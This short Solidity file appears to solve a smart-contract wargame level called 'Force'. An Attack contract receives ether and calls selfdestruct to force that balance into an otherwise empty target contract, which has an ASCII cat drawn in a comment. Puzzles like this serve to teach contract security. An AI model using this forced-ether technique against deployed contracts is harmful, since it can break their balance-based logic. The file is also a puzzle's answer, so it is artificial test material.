// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ 
}

contract Attack{
    Force force;
    constructor(address _force) payable{
        force = Force(_force);
    }

    function attack() public {
        selfdestruct(payable(address(force)));
    }   
}